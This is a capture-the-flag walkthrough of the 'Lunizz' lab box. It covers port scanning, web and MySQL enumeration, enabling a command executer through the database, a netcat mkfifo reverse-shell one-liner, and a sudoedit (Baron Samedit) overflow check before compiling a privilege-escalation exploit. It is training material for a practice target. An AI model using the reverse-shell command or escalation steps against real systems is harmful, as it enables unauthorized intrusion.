# Lunizz CTF

- Recon Stage
    1. Port Mapping using Threader3000

        ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled.png)

    2.  Nmap Scan

    `nmap -p22,80,3306,4444,5000 -sV -sC -T4 -Pn {box ip}` 

    ```

    PORT     STATE SERVICE    VERSION
    22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 f8:08:db:be:ed:80:d1:ef:a4:b0:a9:e8:2d:e2:dc:ee (RSA)
    |   256 79:01:d6:df:8b:0a:6e:ad:b7:d8:59:9a:94:0a:09:7a (ECDSA)
    |_  256 b1:a9:ef:bb:7e:5b:01:cd:4c:8e:6b:bf:56:5d:a7:f4 (ED25519)
    80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    3306/tcp open  mysql      MySQL 5.7.32-0ubuntu0.18.04.1
    | mysql-info: 
    |   Protocol: 10
    |   Version: 5.7.32-0ubuntu0.18.04.1
    |   Thread ID: 6
    |   Capabilities flags: 65535
    |   Some Capabilities: SupportsLoadDataLocal, Support41Auth, Speaks41ProtocolOld, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsCompression, ODBCClient, SwitchToSSLAfterHandshake, LongPassword, LongColumnFlag, FoundRows, SupportsTransactions, ConnectWithDatabase, Speaks41ProtocolNew, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
    |   Status: Autocommit
    |   Salt: |Q\x1Egd\x01 \x0Bd\x0D%G2S}]\x01\x06m4
    |_  Auth Plugin Name: mysql_native_password
    | ssl-cert: Subject: commonName=MySQL_Server_5.7.32_Auto_Generated_Server_Certificate
    | Not valid before: 2020-12-10T19:29:01
    |_Not valid after:  2030-12-08T19:29:01
    |_ssl-date: TLS randomness does not represent time
    4444/tcp open  tcpwrapped
    5000/tcp open  tcpwrapped
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```

    - There are 2 ports which are "TCPWRAPPED".

        It means that a full TCP handshake was completed, but the remote host closed the connection without receiving any data.

        ![https://media0.giphy.com/media/G5X63GrrLjjVK/200w.gif](https://media0.giphy.com/media/G5X63GrrLjjVK/200w.gif)

- Enumeration
    - Enumerating Webpage
        - Gobuster Scan

            ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%201.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%201.png)

            Lets hop in each of the webpage one by one.

            - index.php

                Its the default Apache Page

                ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%202.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%202.png)

                ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%203.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%203.png)

                Nothing Interesting Here, Moving on.

            - hidden

                This page looks good, we gotta form kind of thing, we can upload images here.
                So if we can bypass the filtration, maybe we can have a reverse shell. 🙂

                ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%204.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%204.png)

                Lets first check where the files are going. This is also a short check to see if its working or not.

                Uploading a Random Image.

                ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%205.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%205.png)

                Okay the webpage says that the image is uploaded to `/uploads` folder.

                ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%206.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%206.png)

                But it never showed up ....☹️

                ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%207.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%207.png)

                This might be a rabbit hole, lets move on for now.

                We will come back here and try to further enumerate this webpage if we don't find anything interesting on the other webpages.

            - instructions.txt

                ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%208.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%208.png)

                We got the credentials of the sql server, its (Redacted-username:Redacted-password)

            - whatever

                ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%209.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%209.png)

                Looks like it's a Command Executer but the Executer Mode is `0`, which in computer Language means "is Disabled".

    - Enumerating SQL Server

        ```
        mysql -h {your-ip} -u {username}  -P 3306 -p
        ```

        To see all the databases we will use `show databases;`

        ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2010.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2010.png)

        The `runornot`database is interesting, lets "USE" that

        ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2011.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2011.png)

        Lets see the tables; 

        ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2012.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2012.png)

        To see whats inside the tables, we will use the basic `Select * from table_name` query.

        ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2013.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2013.png)

        Run is set to 0 , this might have a connection to what we saw [here.]() 

        Lets update this to 1 and see if we can execute commands.

        ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2014.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2014.png)

- Getting a foothold

    After changing the values on the database, we got `Command Executer Mode: 1`

    ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2015.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2015.png)

    - Starting up a listener

        ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2016.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2016.png)

    - Netcat OpenBsd [Reverse-Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd)

        ```
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {tun0-ip} 1234 >/tmp/f
        ```

    ***We got it!!***

    ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2017.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2017.png)

    [Stabilizing this shell](https://www.notion.so/Python-d48fc37b9f1345f5abe80845c0ca26dc) 

    ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2018.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2018.png)

- Privilege Escalation

    Uploading [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) and [kernelexploitsuggestor](https://github.com/mzet-/linux-exploit-suggester) to the box and see if I have something to exploit.

    While linpeas was running, we got some hits on Kernel-exploit-suggestor

    ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2019.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2019.png)

    Time to try the latest Heap Buffer-Overflow Exploit, {[Baron Samedi](https://tryhackme.com/room/sudovulnssamedit)t}

    To check if its vulnerable , we can just use this command

    ```python
    sudoedit -s '\' $(python3 -c 'print("A"*1000)')
    ```

    ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2020.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2020.png)

    Uploading the exploit directory to the machine

    ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2021.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2021.png)

    - cd into the directory and use `make` command to compile the exploit.

    ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2022.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2022.png)

    ![Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2023.png](Lunizz%20CTF%2063e7baba680c4483ab7a521dd3e35d51/Untitled%2023.png)